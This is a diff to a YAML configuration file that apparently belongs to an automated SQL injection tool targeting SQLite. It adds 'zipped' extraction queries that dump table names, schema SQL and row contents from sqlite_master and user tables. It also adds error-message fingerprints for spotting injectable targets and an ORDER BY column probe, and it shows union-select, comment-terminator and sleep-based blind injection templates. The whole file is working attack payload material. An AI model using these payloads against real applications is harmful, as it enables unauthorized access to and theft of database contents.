@@ -23,7 +23,7 @@ resource:
            'sqlite_master' r,
            count(*) q
        from sqlite_master
-       WHERE type = 'table'
+       where type = 'table'
    )
    ${limit}
 
@@ -39,8 +39,8 @@ resource:
    from (
        select *
        from sqlite_master
-       WHERE type = 'table'
-       ORDER BY tbl_name
+       where type = 'table'
+       order by tbl_name
        ${limit}
    )
 
@@ -81,6 +81,47 @@ resource:
      )
     concat: "|| '%7f' ||"
 
+ zipped:
+  database: |
+   select
+       '${enclose_value_sql}sqlite_master${separator_qte_sql}'
+       || count(*)
+       || '${enclose_value_sql}${trail_sql}'
+   from sqlite_master
+   where type = 'table'
+   ${limit}
+
+  table: |
+   select
+       '${enclose_value_sql}'
+       || name
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   from sqlite_master
+   where type = 'table'
+   ${limit}
+
+  column: |
+   select
+       sql
+       || '${trail_sql}'
+   from sqlite_master
+   where tbl_name = '${table}'
+   and type = 'table'
+   ${limit}
+
+  row:
+   query: |
+    select
+        '${enclose_value_sql}'
+        || ${fields}
+        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+    from ${table}
+    ${limit}
+   fields:
+    field: |
+     ${field.value}
+    concat: "|| '%7f' ||"
+
 strategy:
  configuration:
   slidingWindow: |
@@ -113,7 +154,15 @@ strategy:
   endingComment: --+-
   fingerprint:
    errorMessage:
+    # Spring
+    - '[SQLITE_SCHEMA]  The database schema changed (no such column: .*) [DB Errorcode=\\d+]'
+    - '[SQLITE_ERROR] SQL error or missing database (near ".*": syntax error) [DB Errorcode=\\d+]'
+    - '[SQLITE_ERROR] SQL error or missing database (incomplete input) [DB Errorcode=\\d+]'
+    - '[SQLITE_ERROR] SQL error or missing database (unrecognized token: ".*") [DB Errorcode=\\d+]'
+    
     - SQLite
+   orderByErrorMessage:
+    - ORDER BY term out of range - should be between
 
  normal:
   indices: union select ${indices}
@@ -154,5 +203,5 @@ strategy:
    ${boolean.mode} if(
        ${test},
        1,
-       SLEEP(${sleep_time})
+       sleep(${sleep_time})
    )
